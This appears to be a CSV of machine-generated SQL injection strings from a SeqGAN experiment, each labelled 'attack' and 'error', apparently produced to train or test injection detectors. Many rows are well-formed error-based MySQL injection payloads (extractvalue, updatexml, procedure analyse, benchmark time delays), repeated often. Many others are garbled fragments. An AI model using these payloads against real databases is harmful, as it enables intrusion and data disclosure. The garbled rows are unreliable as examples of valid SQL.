attack,"1%""   )    )     (  extractvalue  (  (   (    1535  =  2826  (   from (  5322  (  (  3393,1   )    )   )  (  extractvalue  (  (  5000000,md5  (  (  3393  =  (  3393,md5  (  (  select   (  elt  (  elt  (  e  (  select   (  elt  (  1297  =  4688  (  1049,,9627,  (  benchmark  (  (  5000000(  (  3393,md5  (  0x4b774c75   (  3681  (  (  0x5c,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,236
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,237
attack,1 pr%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,238
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,239
attack,"1%kppro  9490,  (  select   (  elt  (  e  (  1297  =  (  (  1297  =  (  1759(  (  8403  =  (  =  (  7982,1   )    )    AND ina",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,240
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,241
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,242
attack,"1%"" and extractvalue  (  (  (  (  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  5000000(  (  (  (  (  (  (  0x2e,md5  (  1808  (  0x2e,concat  (  ,  (  select   (  elt  (  1808  =  (  (  1808  =  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elte(  e  (  elt  0x4b774c75   end  (  =  (  5603  1802  (  elt  (  (  7982  =  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,243
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,244
attack,"1%%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,245
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,246
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjgeq"" like ""k(   (r 5847  ut  elt  3393  =  (  (  0x4b774c75   (  3576  =  3393,  (  benchmark  (  (  benchmark  (  (  5000000,md5  (  (  0x5c,  (  benchmark  (  select   (  a  )  (  (  (  eld  (  2917=  (  1297,concat  (  (  (  0x2e,md5  (  =  (  7982,1   )    AND 'i'  =  1 cast  (  1 extractvalue  (  (  (  7982,  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,247
attack,1%'  =  'k,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,248
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'k3863innggnzn--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,249
attack," AND or extractvalueextractvalue  (  (  (  0x5c,concat  (  0x2e,0x7171706a71,  (  (  (  select   (  5704  =  5530  (  (  (  e  (  0x2e,md5  (  select   (  elt  (  7982  =  (  (  1808,  (  0x2e,0x7171706a71,  (  (  benchmark  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  2917,concat  (  (  (  0x5c,md5  (  0x5c,0x7171706a71,  (  select   (  e  (  elt  (  1808  =  (  0x2e,(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,250
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,251
attack," 1354 1  =  (  2518  )  =  2518  (   from d 0 0 from dual  )  )  )   end  (  (  elt  elt  (  1808  =  (  (  select   (  elt  (  elt  (  7982  =  (  1808,concat  (  (  (  0x2e,md5  (  1808  =  (  (  3393  (  (  (  8862  (  (  0x2e,md5  (  0x5c,0x7171706a71,0x7171706a71,  (  select   (  3933 0 fromys d d a",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,252
attack,"1%,Nvvvq""  =  ""28132051    &eygmh""  =  ""e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,253
attack,"1"" and extractvalue  (  (  ' like '  (  (  e  (  0x4b774c75   )    (  extractvalue  (  (  1808,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  1808,1   )    (  extractvalue  (  9627,md5  (  (  0x5c,  (  select   (  (  elt  (  elt  (  9788  =  0  (  0x5c,  (  (  benchmark  (  =  (   (  6581  (  (  0x2e,0x7171706a71,  (  select   (  ut  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,254
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,255
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,256
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,257
attack,"1"" proce analancaddrel  el  e  elt  (  select   (  4660  =  (  (  7982  =  (  (  3393,concat  (  (  (  (  0x2e,md5  (  (  0x5c,  (  5000000(  (  (  0x5c,0x7171706a71,  (  select   (   SELECT dual   e     (  5777  (  (  e  (  7982  =  (  (  1759(  0x2e,0x7171706a71,  (  (  5000000,md5  (  (  0x2e,1   )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,258
attack,"1%pk'  =  'cx""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,259
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,260
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ytlf'  =  'ymeduganFROM 2501  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  0x2e,md5  (  =  8868  (  1808,md5  (  0x2e,0x7171706a71,  (  (  7997  =  (  7982,concat  (  (  (  3393,1   (  extractvalue  (  (  9255,concat  (  (  (  0x5c,  (  select   (  elt  (  e  (  0x4b774c75   )    (  extractvalue  (  (  (  1297,1   (  case updatexml  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,261
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,262
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,263
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,264
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,265
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,266
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,267
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,268
attack,"1' and extractvalue  (  (  (  (  7982,concat  (  (  (  (  (  =  (  (  (  (  3393  (  0x2e,md5  (  select   (  5000000(  (  elt  (  7982  =  (  (  1297,concat  (  (  (  (  0x5c,  (  (  (  select   (  el  (  1808  =  (  (  0x2e,0x7171706a71,  (  select   (  elta  elt  2917  =  (  (  (  0x5c,1   )    (  extractvalue  (  9627,1   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,269
attack,"1%ik'  =  'kbdroceedu   (    el  el  (  1759  =  (  (  0x2e,  (  (  select   (  1808,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  5704  )  =  (  (  1297,  (  0x52515a50   (  8868  (  elt  (  e  (  7982  =  (  (  0x2e,md5  (  =  7982  (  (  0x2e,0x7171706a71,  (  (  select   (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,270
attack,"1%"" and updatexml  (  (  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  =   (  0dual  )   end  (  (  (  case when   (  4774  (   (  8375  (  (  2917  =  (  (  (  0x5c,  (  benchmark  (  5000000(  (  1 as dua  elt  (   or  (  elt  (  et  (  5000000,md5  (  (  1297  =  (  0x2e,concat  (  (  select   (  elt a  )  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,271
attack,"1%'   )    )    (re  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  (  (  select   (  )  el  (  3393  =  (  =  (  1808,concat  (  0x5c(  (  0x2e,0x7171706a71,  (  2768  (  select   )  (  elt  1297  =  (  0x5c,0x7171706a71,1   )    (  select   (  case 0 from d5  (  el dua  )   or 0   (  (  )  elt  (  elt  (  1808  =  (  1808,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,272
attack,"1%%""   )    )     (  extractvalue  (  9627,concat  (  =  (  (  =  (  (  1808,1   )    uaxys)  9338  extractvalue  (  9627,md5  (  (  0x5c,  (  select   (  el  (  1808  =  1   from du  )   (  5777  (  benchmark  (  (  (  5000000,  (  (  9255,concat  (  (  (    (  0x2e,0x7171706a71,  (  5000000,md5  (  (  select   (  9667  =  (  (  1808  =  (  3393,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,273
attack,"1%""   )    )     extractvalue  (  (  (  8862,concat  (  (  (  (  0x2e,1   )    (  select   (  1812  (  (  0x2e,0x7171706a71,  (  select   (  elta  e  (  elt  (  1808  =  (  (  0x5c,  (  (  (  select   (  0x5c,0x717a767a71   (  1724  (  ( 4774 0 0 from duat  elt  elt  (  elt  (  1297  =  7529  0x7171706a71,0x7171706a71benchmark  (  (  8862,  (  (  0x2e,md",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,274
attack,"1%'   )    usqxyysz  gz  (  extractvalue  (  (  (  select   (  elt  )  8862  =  (  (  0x2e,md5  (  (  0x2e,8666  (  (  5000000,md5  (  0x2e,md5  (  (  7982  =  (  (  1808,m5  (  (  (  (  0x2e,0x7171706a71,  (  select   (  5433  (  1808,1   )    (  extractvalue  (  9627,concat  (  7982  (  (  (  0x2e,  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,275
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  'kqus"" like ""c"" like ""ei",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,276
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,277
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,278
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,279
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,280
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,281
attack,"1select   )    )YS.extractvalue  (  9627,md5  =  (  (  2917  (  (  0x2e,0x7171706a71,  (  (  select   (  case when   (  8375  (  (  e  (  select(  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  5000000(  (  (  1808  =  (  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  benchmark  (  5000000(  (  select   (  el  0x4b774c75   end  (  uad aba",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,282
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,283
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,284
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,285
attack,"1%'   )    )    (    AND 6369  =  1 extractvalue  (  (  (  (  (  2446  (  (  3393,concat  (  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  0x52515a50   (  9393  (  (  ut  (  elt  (  0x2e,0x7171706a71,  select,  (  (  5000000,md5  (  9393  =  1 extractvalue  (  (  (  7982,1   )    ual  (  select 0 from)    (  4568  (  (  =  ut6560  =  4660  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,286
attack,"1"" and extractvalue  (  (  (  (  (  (  (  (  0x5c,  (  (  5000000,md5  (  3393  (  (  0x5c,  (  benchmark  (  (  benchmark  (  benchmark  (  5000000(  0x2e,md5  (  (  0x2e,0x7171706a71,  (  t  (  benchmark  (  (  5000000,md5  (  (  select   (  3393  =  5433  (  (  0x5c,  (  select   (  elt  (  elt  0x4b774c75   (  1802  )  (  =  (  (  (  3393  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,287
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,288
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,289
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  'kfrol'  =  'ejUAkAkkjy)  9083  )  select   (  2768  =  (  7982,1   )    (  extractvalue  (  9627,md5  (  (  0x2e,0x7171706a71,  (  select   (  case 0 0 from (    (  1724  )   (  (  elter at  (  elt  (  6166  =  8768  =  (  1297,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,290
attack,1%%y'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,291
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'y bnnh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,292
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,293
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'znh(wmhomyogecon WHEREFROMw'  =  'zncxpk",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,294
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""kknzddr.get_host_nab  (  1049  =  (  (  (  0x2e,0x7171706a71,  (  9255,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  1297  =  (  (  7982,1   )    (  extractvalue  (  9627,concat  (  (  7982  =  (  (  3393  =  (  (  5740  =  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  0x2e,  (  (  (  select   (  eltt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,295
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,296
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,297
attack,"1%""  =  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,298
attack,"1%""  )  )   from dualoben du an  (  elt  (  5198    =  (  (  1808,1   )    )    cast  51 as as inal  =  1297  =  (  (  1808,m.at  5000000,md5  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  7982  =  (  1297,1   from d a  (  eOdual  )  )   end  (  (  e  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,299
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,300
attack," and  (  extractvalue  (  (  (   (  (   (  ut  (   from dual  )   end  (  (  elt  )  elt  (  1808  =  (  3393,1   (  extractvalue  (  (  9627  )  (  (  (  3393,md5  (  (  9255,concat  (  0x2e,0x7171706a71,  (  (  select   (  e  )  2446  (  (  (  elt  (  7982  =  (  3393  (  (  =  (  (  0x2e,md5  (  select   (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,301
attack,"%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,302
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kp'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,303
attack,"1%%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'pannISTINCT  (  7757  (  1 as al  elt  (  1297  =  (  (  0x5c,  (  benchmark  (  (  benchmark  (  5000000,0x7171706a71,md5  (  5000000,md5  (  (  select   (  5777  =  (  1297,1   )    (  9338  select   (  )   and updatexml  (  (  (  (  (  1 a  (  =  (  7982,1  )  )  (  extractvalue  (  (  benchmark  (  (  9255,1   )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,304
attack,"1%""   )    )    AND 8083  =  7757  (  1 extractvalue  (  (  (  (  (  5000000(  (  (  (  0x5c,I  (  (  5000000,md5  (  0x5c,  (  select   (  elt  e  (  (  1759  (  (  0x2e,0x7171706a71,  (  9627,concat  (  (  0x5c,md5  (  (  0x5c,0x7171706a71,  (  ,  (  select   (  elt  )  0x5c,0x7171706a71,  (  (  select   (  e  (  e0x7171706a712914  =  3393,  (  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,305
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,306
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,307
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,308
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,309
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,310
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,311
attack," 1   )    (  select   (  6581  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  5000000(  select   (  elt  (  (  e  (  9788  =  (  3393,1   (  5423  (  select 0 from ddual  )   end  (  e  (  e  (  elt  elt  (  1808  =  (  1808,concat  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  (  0x5c,  (  9627,md5  (  0x2e,0x7171706a71,  (  select   (  5740",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,312
attack,"1 where updatexml  (  (  (  (  (  (  3393,concat  =  (  (  (  (  (  (  (  (  5000000(  (  (  (  0x2e,concat  (  (  0x5c,    =  (  (  3393,concat  (  (  (  0x2e,md5  (  =  (  (  (  1297,concat  (  (  (  0x2e,0x7171706a71,  extractvalue  (  (  benchmark  (  benchmark  (  (  8421  1759,1   )    ua",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,313
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,314
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,315
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,316
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,317
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,318
